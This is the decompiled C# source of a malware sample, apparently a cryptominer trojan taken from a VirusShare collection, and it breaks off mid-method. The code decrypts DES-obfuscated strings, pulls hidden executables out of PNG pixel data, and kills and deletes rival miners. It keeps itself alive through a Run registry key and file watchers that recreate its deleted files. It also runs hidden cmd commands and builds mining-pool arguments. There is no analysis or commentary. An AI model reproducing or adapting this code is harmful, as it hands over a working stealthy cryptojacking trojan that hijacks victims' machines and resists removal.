// Decompiled with JetBrains decompiler
// Type: nObccFNERDrOuFDFCKrV.Program
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 23C7FD0B-4C5E-45FA-9F45-F06AAF65FD36
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Foreign.mwob-4fd4f54b4ecf3ab9c8c0fe7f1862a82fb61f8c54dca21e92886540ed7c165eba.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace nObccFNERDrOuFDFCKrV
{
  internal class Program
  {
    private static int GdPGmbykHJbgKtMViEZU = 1;
    private static int IzUnJsGMZRcKUXzXjCUb = 0;
    private static int EdLhSMANUPLRlgwXCQMS = 0;
    private static bool ScWFlCrgXMZPjpRcgGId = false;
    private static bool VDWCaRvSBWxHrNRQAroJ = false;
    private static bool reg_PfUIVvSQPKIRnZdUQAMC = true;
    private static string tAdLInDnkFaMSqrKxBLf = "";
    private static byte[] MoGIWDSFXlKkDWSHLJBZ = (byte[]) null;
    private static string bJDIXSRVzBHUSzFkLxDm = "";
    private static string maNDIKmyVgEMYyXmKkLq = "";
    private static WebClient SmbQTRZAEgCGwwRaIhDI = new WebClient();
    private static string obPVxcMKKWVHlzHtkJRq = "";
    private static string NAHAGIPbsSioEjNiGZii = "";
    private static string AEhvQGmQGRfTsFLpJAmS = "";
    private static string VdPbRuyNdyLLgMYlNICZ = "";
    private static string UATFnMLlTdfdIYKLMkiY = "";
    private static string shRRaIEJFxlgqJQTTAGMu = "";
    private static string uZmnJjKPJdRLjQEAXjbH = "";
    private static string SMooZVSNmMlqKODCBhAc = "";
    private static string sHBxtsJzDEnHALgAitbZD = "";
    private static string scGCrNKRnpzyXFtbrEBRr = "";
    private static string cGCrNKRnpzyXFtbrEBRrIP = "";
    private static string VjvFFNLKTIFTMUASUTCS = "";
    private static string sCefPlSLxBFArqXmKnVZR = "";
    private static string sPfUIVvSQPKIRnZdUQAMC = "";
    private static string ssHDLoOYjNtIJMrtYtrGE = "";
    private static string sZXHwKGKzXGkLDzHsCKZQ = "";
    private static byte[] HhQZOQMORGOtefiTNfVD = (byte[]) null;
    private static byte[] HhQZOQMORGOtefiTNfVD2 = (byte[]) null;
    private static byte[] CKYOREVEjIwLBgQkrBxS = Encoding.ASCII.GetBytes("DbMthuPD");
    private static bool hRRaIEJFxlgqJQTTAGMu;
    private static bool HBxtsJzDEnHALgAitbZD;
    private static bool cGCrNKRnpzyXFtbrEBRr;
    private static bool CefPlSLxBFArqXmKnVZR;
    private static bool PfUIVvSQPKIRnZdUQAMC;
    private static bool sHDLoOYjNtIJMrtYtrGE;
    private static bool ZXHwKGKzXGkLDzHsCKZQ;
    private static List<string> proc = new List<string>();
    private static string OlNEtfXVWMYWpldQadKT = "";
    private static string p = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.ebdYePdrDCZOZfDQgbFL("WS4gNVaO7/9PzvCk38ScBRqWt+gzz1xN");
    private static int atDVkiKABXrCEfiuWzHJ = 50;

    private static void Main()
    {
      if (Program.YTqwQlYYYUpyIsZLNZyW())
        Program.umzBOKtrXEPrQuZtELYL();
      if (Program.WTPlITKRIzwRUDrfDkXW())
        Program.umzBOKtrXEPrQuZtELYL();
      if (Program.checkSoviet())
        Program.umzBOKtrXEPrQuZtELYL();
      if (Program.checkInsidiousAndGeneral())
        Program.umzBOKtrXEPrQuZtELYL();
      Program.OdfIFZKfMYaVDVUKJcGL();
      Program.UATFnMLlTdfdIYKLMkiY = "8";
      Program.shRRaIEJFxlgqJQTTAGMu = "true";
      Program.uZmnJjKPJdRLjQEAXjbH = Program.ebdYePdrDCZOZfDQgbFL("faa51T5ydNZ9suXyk/quMLLH61x2VQHIFX06FcGzyhg=");
      Program.SMooZVSNmMlqKODCBhAc = Program.ebdYePdrDCZOZfDQgbFL("Gwmie2KR8Xz+jEzNnZchIYmkIrciBZIZ");
      Program.sHBxtsJzDEnHALgAitbZD = "true";
      Program.scGCrNKRnpzyXFtbrEBRr = "[PROXY]";
      Program.cGCrNKRnpzyXFtbrEBRrIP = "[IPROXY]:[PPROXY]";
      Program.VjvFFNLKTIFTMUASUTCS = "10";
      Program.sCefPlSLxBFArqXmKnVZR = "[MELT]";
      Program.sPfUIVvSQPKIRnZdUQAMC = "true";
      Program.ssHDLoOYjNtIJMrtYtrGE = "true";
      Program.sZXHwKGKzXGkLDzHsCKZQ = "true";
      Program.hRRaIEJFxlgqJQTTAGMu = Program.tYQMCSLnsFMqDBYKIwGn(Program.shRRaIEJFxlgqJQTTAGMu);
      Program.HBxtsJzDEnHALgAitbZD = Program.tYQMCSLnsFMqDBYKIwGn(Program.sHBxtsJzDEnHALgAitbZD);
      Program.cGCrNKRnpzyXFtbrEBRr = Program.tYQMCSLnsFMqDBYKIwGn(Program.scGCrNKRnpzyXFtbrEBRr);
      Program.CefPlSLxBFArqXmKnVZR = Program.tYQMCSLnsFMqDBYKIwGn(Program.sCefPlSLxBFArqXmKnVZR);
      Program.PfUIVvSQPKIRnZdUQAMC = Program.tYQMCSLnsFMqDBYKIwGn(Program.sPfUIVvSQPKIRnZdUQAMC);
      Program.sHDLoOYjNtIJMrtYtrGE = Program.tYQMCSLnsFMqDBYKIwGn(Program.ssHDLoOYjNtIJMrtYtrGE);
      Program.ZXHwKGKzXGkLDzHsCKZQ = Program.tYQMCSLnsFMqDBYKIwGn(Program.sZXHwKGKzXGkLDzHsCKZQ);
      Program.obPVxcMKKWVHlzHtkJRq = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.ebdYePdrDCZOZfDQgbFL("qeO1DBwu2GE=");
      Program.NAHAGIPbsSioEjNiGZii = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.ebdYePdrDCZOZfDQgbFL("WS4gNVaO7/9PzvCk38ScBRqWt+gzz1xN");
      Program.AEhvQGmQGRfTsFLpJAmS = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      Program.VdPbRuyNdyLLgMYlNICZ = Program.AEhvQGmQGRfTsFLpJAmS + Program.ebdYePdrDCZOZfDQgbFL("GGwKr8vKMuo=");
      Program.bJDIXSRVzBHUSzFkLxDm = Program.VdPbRuyNdyLLgMYlNICZ;
      if (Program.HBxtsJzDEnHALgAitbZD)
        Program.WKDTERwNHiGUxWvkayAT();
      Program.IOnOXxvsXVfVSwLCXlQD();
      Program.CEAYHSwEbaPLURCYEWFF();
      if (Program.PfUIVvSQPKIRnZdUQAMC)
        Program.ZDFDqOxCTGETIUTTDoAU();
      if (!Program.CefPlSLxBFArqXmKnVZR)
        return;
      Program.UjOcAHMRIvjpTDzyjIOq();
    }

    public static string ebdYePdrDCZOZfDQgbFL(string cryptedString)
    {
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      return new StreamReader((Stream) new CryptoStream((Stream) new MemoryStream(Convert.FromBase64String(cryptedString)), cryptoServiceProvider.CreateDecryptor(Program.CKYOREVEjIwLBgQkrBxS, Program.CKYOREVEjIwLBgQkrBxS), CryptoStreamMode.Read)).ReadToEnd();
    }

    private static void OdfIFZKfMYaVDVUKJcGL()
    {
      Program.OlNEtfXVWMYWpldQadKT = "";
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            string lower = process.MainModule.FileVersionInfo.FileDescription.ToLower();
            if (!lower.Contains("MoGIWDSFXlKkDWSHLJBZsoft") && !lower.Contains("coin-miner"))
            {
              if (!lower.Contains("coinminer"))
                continue;
            }
            Program.proc.Add(process.ProcessName);
          }
          catch
          {
          }
        }
        Program.umzBOKtrXEPrQuZtELYL();
      }
      catch
      {
      }
    }

    private static void umzBOKtrXEPrQuZtELYL()
    {
      try
      {
        foreach (string processName in Program.proc.ToArray())
        {
          if (Process.GetProcessesByName(processName).Length >= 1)
          {
            foreach (Process process in Process.GetProcessesByName(processName))
              process.Kill();
          }
        }
      }
      catch
      {
      }
      try
      {
        if (Program.OlNEtfXVWMYWpldQadKT != "")
        {
          if (Program.YTqwQlYYYUpyIsZLNZyW())
            Program.JVqDNYHEkNrNHhdfqOOb(Program.OlNEtfXVWMYWpldQadKT);
          if (Program.WTPlITKRIzwRUDrfDkXW())
          {
            Program.JVqDNYHEkNrNHhdfqOOb(Program.OlNEtfXVWMYWpldQadKT);
            System.IO.File.Delete(Path.GetTempPath() + "\\winupdater.exe");
          }
          if (Program.checkSoviet())
            Program.JVqDNYHEkNrNHhdfqOOb(Program.OlNEtfXVWMYWpldQadKT);
          if (Program.checkInsidiousAndGeneral())
            Program.JVqDNYHEkNrNHhdfqOOb(Program.OlNEtfXVWMYWpldQadKT);
        }
      }
      catch
      {
      }
      Program.proc.Clear();
    }

    private static void JVqDNYHEkNrNHhdfqOOb(string dir) => Directory.Delete(dir, true);

    private static bool YTqwQlYYYUpyIsZLNZyW()
    {
      foreach (string directory1 in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
      {
        if (directory1.Contains("Windows"))
        {
          foreach (string directory2 in Directory.GetDirectories(directory1))
          {
            if (directory2.Contains("macro"))
            {
              Program.OlNEtfXVWMYWpldQadKT = directory1;
              Program.proc.Add("wscript");
              foreach (string file in Directory.GetFiles(directory1))
              {
                if (file.EndsWith(".exe"))
                  Program.proc.Add(file.Substring(file.LastIndexOf("\\") + 1).Replace(".exe", ""));
              }
              return true;
            }
          }
        }
      }
      return false;
    }

    private static bool checkInsidiousAndGeneral()
    {
      foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
      {
        if (directory.Length == 5)
        {
          foreach (string file in Directory.GetFiles(directory))
          {
            if (file.EndsWith(".exe"))
              Program.proc.Add(file.Substring(file.LastIndexOf("\\") + 1).Replace(".exe", ""));
            if (file == "libcurl-4.dll")
            {
              Program.OlNEtfXVWMYWpldQadKT = directory;
              return true;
            }
            if (file == "btc-evergreen.il")
            {
              Program.OlNEtfXVWMYWpldQadKT = directory;
              return true;
            }
            if (file == "interop.coineng.dll")
            {
              Program.OlNEtfXVWMYWpldQadKT = directory;
              return true;
            }
          }
        }
      }
      Program.proc.Clear();
      return false;
    }

    private static bool checkSoviet()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Intel";
      if (Directory.Exists(path) && System.IO.File.Exists(path + Program.ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog==")))
      {
        Program.OlNEtfXVWMYWpldQadKT = path;
        string[] files = Directory.GetFiles(path);
        int index = 0;
        if (index < files.Length)
        {
          string str = files[index];
          if (str.EndsWith(".exe"))
            Program.proc.Add(str.Substring(str.LastIndexOf("\\") + 1).Replace(".exe", ""));
          return true;
        }
      }
      return false;
    }

    private static bool WTPlITKRIzwRUDrfDkXW()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Update Drivers";
      if (!System.IO.File.Exists(Path.GetTempPath() + "\\winupdater.exe") || !System.IO.File.Exists(str + "\\micromgr.exe"))
        return false;
      Program.OlNEtfXVWMYWpldQadKT = str;
      Program.proc.Add("micromgr");
      Program.proc.Add("winupdater");
      return true;
    }

    public static byte[] fIAMSTGYciWyITNEOLqQ(string image_in)
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(image_in);
      Bitmap data = new Bitmap(manifestResourceStream);
      manifestResourceStream.Close();
      return Program.KNwnShNGtUDMUzYSvkkM(data);
    }

    public static byte[] KNwnShNGtUDMUzYSvkkM(Bitmap data)
    {
      List<byte> byteList = new List<byte>();
      for (int x = 0; x < data.Width; ++x)
      {
        for (int y = 0; y < data.Height; ++y)
        {
          System.Drawing.Color pixel = data.GetPixel(x, y);
          if (pixel != System.Drawing.Color.FromArgb(0, 0, 0, 0))
          {
            byteList.Add(pixel.R);
            byteList.Add(pixel.G);
            byteList.Add(pixel.B);
          }
        }
      }
      return Program.YXIMINaEfQKALUqIcKHB(byteList.ToArray());
    }

    private static byte[] YXIMINaEfQKALUqIcKHB(byte[] zippedData)
    {
      using (MemoryStream destination = new MemoryStream())
      {
        using (MemoryStream memoryStream = new MemoryStream(zippedData))
        {
          using (GZipStream source = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
            Program.LABqNPPgYGLsKjPhFKdP((Stream) source, (Stream) destination);
        }
        return destination.ToArray();
      }
    }

    private static void LABqNPPgYGLsKjPhFKdP(Stream source, Stream destination)
    {
      byte[] buffer = new byte[2048];
      int count;
      while ((count = source.Read(buffer, 0, buffer.Length)) > 0)
        destination.Write(buffer, 0, count);
    }

    private static void WKDTERwNHiGUxWvkayAT()
    {
      if (!(Application.ExecutablePath != Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")))
        return;
      try
      {
        if (System.IO.File.Exists(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")))
          System.IO.File.Delete(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
        System.IO.File.Copy(Application.ExecutablePath, Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
        Process.Start(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
        if (!Program.CefPlSLxBFArqXmKnVZR)
          Process.GetCurrentProcess().Kill();
        else
          Program.UjOcAHMRIvjpTDzyjIOq();
      }
      catch
      {
      }
    }

    private static void KhJZHDIBNWBiAVLTFyBC()
    {
      try
      {
        if (System.IO.File.Exists(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg==")))
          System.IO.File.Delete(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="));
        System.IO.File.WriteAllBytes(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="), Program.fIAMSTGYciWyITNEOLqQ("oQNvXRNnue.png"));
        Process.Start(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="));
      }
      catch
      {
      }
    }

    private static void ZDFDqOxCTGETIUTTDoAU()
    {
      Program.EDlduuSDzqIpKFmCRDPT();
      if (!Program.HBxtsJzDEnHALgAitbZD)
        return;
      Registry.CurrentUser.OpenSubKey(Program.ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), true).SetValue(Program.ebdYePdrDCZOZfDQgbFL("q8u/BfKd9sfEVMKdgsW6b3KOnmSZ1cBC"), (object) (Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")));
    }

    private static void UjOcAHMRIvjpTDzyjIOq()
    {
      if (!(Application.ExecutablePath != Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")))
        return;
      Program.QSWVmFLiTVoqZQTNHWQQ(Program.ebdYePdrDCZOZfDQgbFL("+GN6g6Xu+5KAgQAF1FhYH++2roAOC/FJpxfgAK4uBqxnOT6j1/GB3Q==") + (object) '"' + Application.ExecutablePath + (object) '"', false);
      Process currentProcess = Process.GetCurrentProcess();
      try
      {
        currentProcess.Kill();
      }
      catch (Exception ex)
      {
      }
    }

    private static void CEAYHSwEbaPLURCYEWFF() => Program.KhJZHDIBNWBiAVLTFyBC();

    private static string ATUrOMwWgLECjtRORpPu()
    {
      string s = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.ebdYePdrDCZOZfDQgbFL("ydWemcT3ufUwy4QW6tyBu/CzS6jMSe55");
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("-o " + Program.uZmnJjKPJdRLjQEAXjbH);
      stringBuilder.Append(" -u " + Program.SMooZVSNmMlqKODCBhAc.Split(':')[0]);
      stringBuilder.Append(" -p " + Program.SMooZVSNmMlqKODCBhAc.Split(':')[1]);
      if (!Program.hRRaIEJFxlgqJQTTAGMu)
        stringBuilder.Append(" -g no");
      else
        stringBuilder.Append(" -g yes");
      stringBuilder.Append(" -I " + Program.VjvFFNLKTIFTMUASUTCS);
      if (Program.cGCrNKRnpzyXFtbrEBRr)
        stringBuilder.Append(" -x " + Program.cGCrNKRnpzyXFtbrEBRrIP);
      if (!Program.ZXHwKGKzXGkLDzHsCKZQ)
        stringBuilder.Append(" -t " + Program.UATFnMLlTdfdIYKLMkiY);
      else
        stringBuilder.Append(" -t " + Program.QoBjJWhQvOZsLGugUMkF());
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString())) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes("xss"));
    }

    private static string QoBjJWhQvOZsLGugUMkF()
    {
      try
      {
        int num = 0;
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(Program.ebdYePdrDCZOZfDQgbFL("3dzLPeIkJOGr92IfzydIeBptti0+MHjcAT86BTHiCb0=")).Get())
          num += int.Parse(managementBaseObject[Program.ebdYePdrDCZOZfDQgbFL("YAusZOsYzgNtlSE2iAC3Sg==")].ToString());
        switch (num)
        {
          case 1:
            return "1";
          case 2:
            return "1";
          case 3:
            return "2";
          case 4:
            return "2";
          case 5:
            return "3";
          case 6:
            return "3";
          case 7:
            return "4";
          case 8:
            return "4";
          case 9:
            return "5";
          case 10:
            return "5";
          default:
            return "6";
        }
      }
      catch
      {
        return "2";
      }
    }

    private static void IOnOXxvsXVfVSwLCXlQD()
    {
      try
      {
        if (!Directory.Exists(Program.VdPbRuyNdyLLgMYlNICZ))
          Directory.CreateDirectory(Program.VdPbRuyNdyLLgMYlNICZ);
        if (!Directory.Exists(Program.AEhvQGmQGRfTsFLpJAmS + "\\Microsoft"))
          Directory.CreateDirectory(Program.AEhvQGmQGRfTsFLpJAmS + "\\Microsoft");
        if (!Directory.Exists(Program.NAHAGIPbsSioEjNiGZii))
          Directory.CreateDirectory(Program.NAHAGIPbsSioEjNiGZii);
        if (System.IO.File.Exists(Program.VdPbRuyNdyLLgMYlNICZ + Program.ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog==")))
        {
          try
          {
            System.IO.File.Delete(Program.VdPbRuyNdyLLgMYlNICZ + Program.ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="));
          }
          catch
          {
          }
        }
        try
        {
          System.IO.File.WriteAllBytes(Program.VdPbRuyNdyLLgMYlNICZ + Program.ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="), Encoding.ASCII.GetBytes(Convert.ToBase64String(Program.fIAMSTGYciWyITNEOLqQ("bWhBUOyotX.png"))));
        }
        catch
        {
        }
        try
        {
          if (System.IO.File.Exists(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")))
            System.IO.File.Delete(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"));
          System.IO.File.WriteAllText(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"), Program.ATUrOMwWgLECjtRORpPu());
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private static bool tYQMCSLnsFMqDBYKIwGn(string arg1) => arg1 == "true";

    public static bool QSWVmFLiTVoqZQTNHWQQ(string Command, bool wait)
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = Program.ebdYePdrDCZOZfDQgbFL("CwcCkNIu7vo=");
        process.StartInfo.Arguments = " /C " + Command;
        process.StartInfo.UseShellExecute = true;
        process.StartInfo.RedirectStandardOutput = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.Start();
        if (wait)
          process.WaitForExit();
        process.Close();
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static void EDlduuSDzqIpKFmCRDPT()
    {
      try
      {
        Program.tAdLInDnkFaMSqrKxBLf = System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"));
      }
      catch
      {
      }
      try
      {
        Program.MoGIWDSFXlKkDWSHLJBZ = System.IO.File.ReadAllBytes(Program.bJDIXSRVzBHUSzFkLxDm + Program.ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="));
      }
      catch
      {
      }
      try
      {
        Program.uZmnJjKPJdRLjQEAXjbH = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(',')[2]));
      }
      catch
      {
      }
      if (!Program.PfUIVvSQPKIRnZdUQAMC)
        Program.reg_PfUIVvSQPKIRnZdUQAMC = false;
      if (Program.reg_PfUIVvSQPKIRnZdUQAMC)
        new Thread((ThreadStart) (() => Program.JOXnZfTIYLBfVftCWkXW())).Start();
      Program._PfUIVvSQPKIRnZdUQAMC();
      if (!Program.sHDLoOYjNtIJMrtYtrGE)
      {
        new Thread((ThreadStart) (() => Program.vJYZNIsKNUipQFKlAqOp())).Start();
      }
      else
      {
        Program.maNDIKmyVgEMYyXmKkLq = Program.ufvMNnZMEJnGWoAYoZxK();
        new Thread((ThreadStart) (() =>
        {
          while (true)
          {
            Program.qIWRIHBtUIRrrtOGyrJt();
            Thread.Sleep(5000);
          }
        })).Start();
      }
    }

    private static void JOXnZfTIYLBfVftCWkXW()
    {
      while (true)
      {
        string[] valueNames = Registry.CurrentUser.OpenSubKey(Program.ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), true).GetValueNames();
        bool flag = false;
        foreach (string str in valueNames)
        {
          if (str.ToLower().Contains("win update service"))
            flag = true;
        }
        if (!flag)
        {
          string str = Program.p + Program.ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==");
          Registry.CurrentUser.OpenSubKey(Program.ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), true).SetValue(Program.ebdYePdrDCZOZfDQgbFL("q8u/BfKd9sfEVMKdgsW6b3KOnmSZ1cBC"), (object) str);
        }
        Thread.Sleep(30000);
      }
    }

    private static int QOLZSmaPeCjBVBRvgWcO()
    {
      int num = 1;
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains("vbc"))
          --num;
      }
      return num;
    }

    public static void _PfUIVvSQPKIRnZdUQAMC()
    {
      FileSystemWatcher fileSystemWatcher1 = new FileSystemWatcher();
      fileSystemWatcher1.Path = Program.p;
      fileSystemWatcher1.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher1.Filter = "*.exe";
      fileSystemWatcher1.Deleted += new FileSystemEventHandler(Program.OnChanged2);
      fileSystemWatcher1.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher1.EnableRaisingEvents = true;
      FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
      fileSystemWatcher2.Path = Program.bJDIXSRVzBHUSzFkLxDm;
      fileSystemWatcher2.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher2.Filter = "*.exe";
      fileSystemWatcher2.Deleted += new FileSystemEventHandler(Program.OnChanged2);
      fileSystemWatcher2.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher2.EnableRaisingEvents = true;
      FileSystemWatcher fileSystemWatcher3 = new FileSystemWatcher();
      fileSystemWatcher3.Path = Program.p;
      fileSystemWatcher3.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher3.Filter = "*.txt";
      fileSystemWatcher3.Deleted += new FileSystemEventHandler(Program.OnChanged3);
      fileSystemWatcher3.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher3.EnableRaisingEvents = true;
    }

    private static void OnChanged3(object source, FileSystemEventArgs e)
    {
      if (!(e.ChangeType.ToString() == "Deleted") || !e.FullPath.ToLower().EndsWith(Program.ebdYePdrDCZOZfDQgbFL("VR3vU9HntydKElnPf5Reyw==")))
        return;
      System.IO.File.WriteAllText(e.FullPath, Program.tAdLInDnkFaMSqrKxBLf);
    }

    private static void OnRenamed(object source, RenamedEventArgs e)
    {
      if (!Program.VDWCaRvSBWxHrNRQAroJ)
      {
        Thread.Sleep(100);
        System.IO.File.Move(e.FullPath, e.OldFullPath);
        Program.VDWCaRvSBWxHrNRQAroJ = true;
      }
      else
        Program.VDWCaRvSBWxHrNRQAroJ = false;
    }

    private static void OnChanged2(object source, FileSystemEventArgs e)
    {
      if (!(e.ChangeType.ToString() == "Deleted"))
        return;
      if (e.FullPath.ToLower().EndsWith("rundll32.exe"))
      {
        if (Program.MoGIWDSFXlKkDWSHLJBZ != null)
          System.IO.File.WriteAllBytes(e.FullPath, Program.MoGIWDSFXlKkDWSHLJBZ);
        else
          System.IO.File.WriteAllBytes(e.FullPath, Encoding.ASCII.GetBytes(Convert.ToBase64String(Program.fIAMSTGYciWyITNEOLqQ("bWhBUOyotX.png"))));
      }
      if (!e.FullPath.ToLower().EndsWith(Program.ebdYePdrDCZOZfDQgbFL("SzUtJGf+g9iawXQMBtS2MQ==")))
        return;
      System.IO.File.WriteAllBytes(Program.NAHAGIPbsSioEjNiGZii + Program.ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="), Program.fIAMSTGYciWyITNEOLqQ("oQNvXRNnue.png"));
    }

    public static void vJYZNIsKNUipQFKlAqOp()
    {
      while (true)
      {
        if (Program.atDVkiKABXrCEfiuWzHJ == 0)
        {
          if (Program.QOLZSmaPeCjBVBRvgWcO() == 1)
            Program.KhJZHDIBNWBiAVLTFyBC();
          Program.atDVkiKABXrCEfiuWzHJ = 550;
        }
        --Program.atDVkiKABXrCEfiuWzHJ;
        Thread.Sleep(50);
      }
    }

    private static void AiuzGaMsufJpCQPOyeLC(string thread_count)
    {
      try
      {
        string str1 = System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(',')[0];
        string str2 = System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(',')[2];
        string str3 = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(',')[1]));
        string s = str3.Substring(0, str3.Length - Program.ufvMNnZMEJnGWoAYoZxK().Length) + thread_count;
        System.IO.File.WriteAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"), str1 + (object) ',' + Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + (object) ',' + str2);
      }
      catch
      {
      }
    }

    private static string ufvMNnZMEJnGWoAYoZxK()
    {
      string str1 = "";
      try
      {
        string str2 = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(',')[1]));
        str1 = str2.Substring(str2.LastIndexOf('-') + 3);
      }
      catch
      {
      }
      return str1;
    }

    private static void QjZJxdNPgoAtFzuxipFV()
    {
      try
      {
        if (Program.QOLZSmaPeCjBVBRvgWcO() == 0)
        {
          if (!Program.ScWFlCrgXMZPjpRcgGId)
            Process.GetProcessesByName("vbc")[0].Kill();
        }
      }
      catch
      {
      }
      if (!Program.ScWFlCrgXMZPjpRcgGId)
      {
        Program.AiuzGaMsufJpCQPOyeLC("8");
        Program.ScWFlCrgXMZPjpRcgGId = true;
        Thread.Sleep(500);
      }
      if (Program.QOLZSmaPeCjBVBRvgWcO() != 1)
        return;
      Program.KhJZHDIBNWBiAVLTFyBC();
    }

    private static void VttUYrBVGGVnrGGaoUBX()
    {
      try
      {
        if (Program.QOLZSmaPeCjBVBRvgWcO() == 0)
        {
          if (Program.ScWFlCrgXMZPjpRcgGId)
            Process.GetProcessesByName("vbc")[0].Kill();
        }
      }
      catch
      {
      }
      if (Program.ScWFlCrgXMZPjpRcgGId)
      {
